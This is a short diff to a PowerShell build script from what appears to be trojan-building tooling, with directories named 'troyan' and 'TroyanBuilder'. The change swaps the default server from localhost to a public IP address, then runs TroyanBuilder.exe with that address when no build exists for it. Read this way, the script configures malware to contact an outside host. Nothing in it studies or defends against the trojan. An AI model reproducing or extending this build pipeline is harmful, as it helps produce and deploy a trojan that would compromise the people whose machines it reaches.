@@ -2,11 +2,9 @@ param (
     [string]$serverName, [string]$action = "apply", [string]$kill="kill", [string]$refiner
 )
 
-
-
 if ($serverName -eq "") {
-    $serverName = "127.0.0.1"
-    $action = "exe"
+    $serverName = "38.180.228.45"
+    $action = "apply"
 } 
 
 if ([string]::IsNullOrEmpty($serverName))
@@ -15,6 +13,17 @@ if ([string]::IsNullOrEmpty($serverName))
 }
 
 $currentScriptPath = $PSScriptRoot
+
+if (-not (Test-Path "C:\data"))
+{
+    New-Item -Path "C:\data" -ItemType Directory -Force
+}
+
+if (-not (Test-Path "C:/data/$serverName"))
+{
+    $builderPath = Join-Path -Path $currentScriptPath -ChildPath "../TroyanBuilder/bin/debug/net9.0/TroyanBuilder.exe"
+    Start-Process -Wait $builderPath -ArgumentList $serverName
+}
 
 if ($refiner -ne "refiner")
 {
@@ -53,7 +62,7 @@ if ($kill -eq "kill" -and $refiner -ne "refiner")
 $scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 Set-Location -Path $scriptDir
 . ".\current.ps1" -serverName $serverName
-. ".\troyan\troyanps\utils.ps1"
+. "..\troyan\troyanps\utils.ps1"
 if ([string]::IsNullOrEmpty($server.rootDir)) {
     throw "compile1.ps1 - server is not linked"
 }
